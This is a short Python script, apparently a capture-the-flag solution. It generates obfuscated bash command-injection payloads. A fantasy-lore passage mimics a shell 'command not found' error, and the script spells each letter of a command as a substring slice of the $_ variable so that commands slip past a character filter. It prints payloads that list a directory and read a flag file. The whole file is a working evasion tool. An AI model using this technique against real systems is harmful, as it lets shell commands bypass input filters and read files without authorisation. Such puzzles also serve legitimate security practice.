import string

calastran = """The Calastran multiverse is a complex and interconnected web of realities, each\nwith its own distinct characteristics and rules. At its core is the Nexus, a\ncosmic hub that serves as the anchor point for countless universes and\ndimensions. These realities are organized into Layers, with each Layer\nrepresenting a unique level of existence, ranging from the fundamental building\nblocks of reality to the most intricate and fantastical realms. Travel between\nLayers is facilitated by Quantum Bridges, mysterious conduits that allow\nindividuals to navigate the multiverse. Notably, the Calastran multiverse\nexhibits a dynamic nature, with the Fabric of Reality continuously shifting and\nevolving. Within this vast tapestry, there exist Nexus Nodes, focal points of\nimmense energy that hold sway over the destinies of entire universes. The\nenigmatic Watchers, ancient beings attuned to the ebb and flow of the\nmultiverse, observe and influence key events. While the structure of Calastran\nembraces diversity, it also poses challenges, as the delicate balance between\nthe Layers requires vigilance to prevent catastrophic breaches and maintain the\ncosmic harmony.': command not found"""


def get_cmd(cmd):
    result = '"$($- 2>&1)"; "$(${_:7:1}${_:20:1})"; "$(${_:14:1}${_:47:1})"; "$(${_:10:1}${_:11:1}${_:15:1} ${_:7:16})"; '
    for c in cmd:
        if c in string.ascii_letters:
            index = calastran.find(c)
            result += f"${{_:{index}:{1}}}"
        else:
            result += c
    return result

print(get_cmd("ls blargh"))
print(get_cmd("cat blargh/flag.txt"))
